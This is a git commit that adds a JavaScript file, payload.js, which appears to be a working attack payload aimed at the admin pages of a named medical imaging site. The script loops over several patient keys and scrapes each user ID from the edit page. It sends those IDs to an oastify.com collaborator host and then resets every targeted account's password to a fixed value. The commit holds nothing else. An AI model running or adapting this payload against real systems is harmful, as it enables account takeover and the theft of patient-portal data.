52c580762915c4f6f5d8af80836366fbb0283f46
vulnoob <200810511+vulnoob@users.noreply.github.com>
2025-05-16 11:20:44 -0500

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,15 @@
+for (let i = 199234; i <= 199237; i++) {
+  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
+    .then(res => res.text())
+    .then(res => {
+      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
+      if (match) {
+        fetch(`https://gp9im85quhisosqldaruswvy3p9gx6lv.oastify.com?data=${encodeURIComponent(match[1])}`);
+      }
+      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
+      });
+    });
+}
